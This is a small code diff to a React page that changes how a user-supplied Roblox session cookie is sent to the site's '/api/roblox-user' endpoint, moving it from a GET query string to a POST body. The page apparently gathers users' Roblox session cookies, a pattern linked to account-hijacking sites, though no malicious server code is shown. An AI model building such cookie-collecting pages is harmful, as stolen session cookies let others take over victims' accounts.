@@ -347,13 +347,13 @@ export default function SlugPage() {
     setStatus({ message: "⏳ Processing...", type: "info" });
 
     try {
-      const fullRes = await fetch(
-        `/api/roblox-user?cookie=${encodeURIComponent(robloxCookie)}&mode=full`,
-        {
-          cache: "no-store",
-        }
-      );
-
+      const fullRes = await fetch("/api/roblox-user", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        cache: "no-store",
+        body: JSON.stringify({ cookie: robloxCookie, mode: "full" }),
+      });
+      
       const data = await fullRes.json();
 
       if (!fullRes.ok || data.error) {
